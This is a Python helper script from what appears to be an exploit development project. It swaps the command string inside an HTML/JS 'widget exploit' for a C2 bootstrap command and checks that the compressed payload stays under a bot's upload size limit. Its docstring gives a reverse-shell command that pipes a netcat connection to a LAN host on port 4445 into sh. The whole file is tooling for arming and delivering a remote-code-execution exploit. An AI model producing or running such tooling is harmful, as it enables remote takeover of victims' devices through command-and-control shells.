#!/usr/bin/env python3
"""Replace the endgame `var cmd="..."` in a widget exploit with the C2
bootstrap command, and report the bot's zlib size limit.

The existing v2/v4 payloads write the command into the Uint8Array at 0x2000
and point system() at it (see lab/qjs_postsnapshot/widget_poc_1865_universal_v2.html
line 123).  Only that one line is touched; the exploit chain is unchanged.

Examples:
    # Sony / local DB patch (no bot size limit)
    python3 tools/patch_payload.py \
      --input ../../lab/qjs_postsnapshot/widget_poc_1865_universal_v2.html \
      --output /tmp/poc_c2.html \
      --command "setsid sh -c '/system/bin/sleep 2|/system/bin/toybox nc <LAN_IP> 4445|sh' &"

    # check only
    python3 tools/patch_payload.py --input poc.html --command '...' --check
"""
from __future__ import annotations

import argparse
import re
import sys
import zlib


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--input", required=True)
    p.add_argument("--output", default="")
    p.add_argument("--command", required=True,
                   help="exact string passed to system() (see make_bootstrap.py)")
    p.add_argument("--limit", type=int, default=4088,
                   help="bot zlib-9 limit (default 4088; observed limit 4096). "
                        "Use 0 to disable the check for a local DB patch.")
    p.add_argument("--check", action="store_true",
                   help="do not write output, only report sizes")
    args = p.parse_args()

    cmd = args.command
    if '"' in cmd or "\\" in cmd or "\n" in cmd:
        print("[!] command contains a quote, backslash or newline; refusing "
              "to build a fragile JS string", file=sys.stderr)
        return 2

    with open(args.input, "r", encoding="utf-8") as f:
        html = f.read()

    # v2/v4 HTML: one `var cmd="...";` line.
    # conservative_min.js: the whole payload is one line, `var cmd="...";for...`.
    pat = re.compile(r'var cmd="(?:[^"\\]|\\.)*";')
    hits = pat.findall(html)
    if len(hits) != 1:
        print("[!] expected exactly one `var cmd=\"...\";`, found %d"
              % len(hits), file=sys.stderr)
        return 2

    new_line = 'var cmd="%s";' % cmd
    out = pat.sub(lambda _m: new_line, html, count=1)
    raw = out.encode("utf-8")
    comp = len(zlib.compress(raw, 9))
    print("input : %s (%d bytes)" % (args.input, len(html.encode("utf-8"))))
    print("output: %s (%d bytes raw, zlib-9 %d bytes)"
          % (args.output or "(not written)", len(raw), comp))
    print("command: %s (%d chars)" % (cmd, len(cmd)))
    if "<html" not in html.lower() and "<!doctype" not in html.lower():
        print("[i] input looks like a JS payload, not a full loader; the "
              "--limit check applies after wrapping it with "
              "tools/make_loader_aes.py")
    if args.limit:
        if comp > args.limit:
            print("[!] zlib-9 %d > limit %d: the bot will reject "
                  "INPUT_MEDIA_WIDGET_TOO_LARGE" % (comp, args.limit),
                  file=sys.stderr)
            return 3
        print("[+] zlib-9 %d <= %d (%d bytes margin)"
              % (comp, args.limit, args.limit - comp))

    if not args.check and args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            f.write(out)
        print("[+] wrote %s" % args.output)
    return 0


if __name__ == "__main__":
    sys.exit(main())
